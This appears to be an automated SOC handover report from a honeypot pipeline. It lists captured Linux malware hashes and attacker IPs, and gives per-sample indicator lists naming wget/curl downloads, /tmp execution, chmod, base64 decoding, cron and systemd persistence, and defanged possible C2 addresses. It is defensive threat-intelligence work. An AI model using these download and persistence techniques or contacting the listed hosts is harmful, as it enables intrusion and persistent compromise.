| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `119.199.176[.]30` | KR | Korea Telecom | **100** ⚠️ | 4 |
| `130.12.180[.]174` | NL | Virtualine Technologies | **100** ⚠️ | 50 |
| `85.217.149[.]31` | CA | NL MODAT | **100** ⚠️ | 50 |
| `66.132.172[.]137` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `86.107.47[.]60` | IR | Netmihan Communication Company Ltd | **100** ⚠️ | 3 |
| `109.160.32[.]102` | NL | Global Communication Net Plc | **100** ⚠️ | 18 |
| `220.120.83[.]75` | KR | Korea Telecom | **100** ⚠️ | 9 |
| `115.190.207[.]155` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |
| `163.7.3[.]154` | ID | BYTEPLUS | **100** ⚠️ | 0 |
| `156.225.1[.]34` | HK | AGOTOZ PTE. LTD | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 200 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 160 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 64 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 61 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 10 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 3 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 307 cases |
| Tool 34  | Credential Extractor        | ✅ 2526 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 24 fingerprints |
| Tool 36  | Command Clustering          | ✅ 11 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 188 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (9.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 87 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 30 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 158 priority case(s) shown individually · 110 recon entry/entries in table (7 group(s) consolidating 17 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-10T16:35:47Z_
